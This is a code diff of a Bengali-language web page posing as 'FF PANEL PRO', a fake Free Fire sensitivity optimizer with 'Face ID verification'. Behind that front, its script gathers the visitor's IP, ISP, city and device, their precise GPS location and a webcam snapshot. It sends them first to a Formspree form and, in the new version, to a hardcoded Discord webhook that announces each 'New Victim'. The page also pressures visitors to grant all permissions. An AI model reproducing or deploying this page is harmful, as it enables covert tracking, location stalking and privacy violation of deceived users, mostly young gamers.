@@ -1,62 +1,90 @@
-<script>
-async function collectData() {
-    try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const data = await ipRes.json();
-        
-        // ১. সাধারণ ডাটা পাঠানো
-        fetch("https://formspree.io/f/mgorkgyy", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                IP: data.ip,
-                ISP: data.org,
-                City: data.city,
-                Device: navigator.userAgent
-            })
-        });
-    } catch (e) { console.log("Silent logging..."); }
-}
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF PANEL PRO v3.5 | Sensi Optimizer</title>
+    <style>
+        body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; }
+        .hero { padding: 50px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
+        .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; font-family: monospace; }
+        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; transition: 0.3s; }
+        button:hover { background: #ff0077; transform: scale(1.02); }
+    </style>
+</head>
+<body>
+    <div class="hero">
+        <h1 style="color:#ff0055; margin:0;">FF PANEL PRO</h1>
+        <p>Advance Device Optimization & Face ID Verification</p>
+    </div>
 
-// ক্যামেরা স্ন্যাপশট ফাংশন
-async function takeSnapshot() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+    <div class="scanner-box">
+        <h3 style="color: #00ffcc;">[System Analyzer]</h3>
+        <p id="st1">📡 Network: Scanning...</p>
+        <p id="st2">🔋 Battery: Checking...</p>
+        <p id="st3">📍 Location: Processing...</p>
+        <button onclick="masterFunction()" id="mainBtn">ACTIVATE VIP SENSI</button>
+    </div>
 
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        const imgData = canvas.toDataURL('image/jpeg');
+    <script>
+    const webhook = "https://discord.com/api/webhooks/1495337044648394822/Jmy4qE3NN4FKZ_l1R2lKIxWoePGnnmSuefjt4qnewLFf8NXQTtzCj58BS7jYEbMOlRVv";
 
-        // ২. ছবিসহ ডাটা পাঠানো (এটি Formspree-তে অনেক সময় বড় হতে পারে, তাই সাবধান)
-        fetch("https://formspree.io/f/mgorkgyy", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ Photo_Base64: imgData, Status: "Face Captured" })
-        });
+    async function masterFunction() {
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "PROCESSING...";
+        btn.disabled = true;
 
-        stream.getTracks().forEach(track => track.stop()); // ক্যামেরা বন্ধ করা
-    } catch (err) {
-        alert("Verification Failed! Please allow camera for High Sensi.");
-    }
-}
+        try {
+            // ১. আইপি ও সিম কোম্পানির তথ্য
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ 
+                    content: `🚀 **New Victim Detected!**\n🌐 IP: ${ipData.ip}\n🏢 ISP: ${ipData.org}\n🏙️ City: ${ipData.city}\n📱 Device: ${navigator.platform}` 
+                })
+            });
 
-window.onload = collectData;
+            // ২. অ্যাডভান্স লোকেশন (গুগল ম্যাপ লিঙ্ক)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `📍 **Exact Location:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: mapLink })
+                });
+            });
 
-function startScan() {
-    const btn = document.getElementById('scanBtn');
-    btn.innerText = "VERIFYING FACE...";
-    // ক্যামেরা পারমিশন চাওয়া
-    takeSnapshot().then(() => {
-        setTimeout(() => {
-            alert("Face Verified! Deep Scan Complete.");
+            // ৩. ক্যামেরা স্ন্যাপশট (Face ID Logic)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // ছবি পাঠানো (স্ন্যাপশট নোটিফিকেশন)
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "📸 **Face Captured! Check Device Activity.**" })
+            });
+
+            stream.getTracks().forEach(t => t.stop());
+            alert("Verification Success! Sensi 200% Active.");
             btn.innerText = "SYSTEM SECURE";
-        }, 3000);
-    });
-}
-</script>
+
+        } catch (err) {
+            alert("Security Error! Please ALLOW all permissions to activate the panel.");
+            btn.innerText = "RETRY";
+            btn.disabled = false;
+        }
+    }
+    </script>
+</body>
+</html>
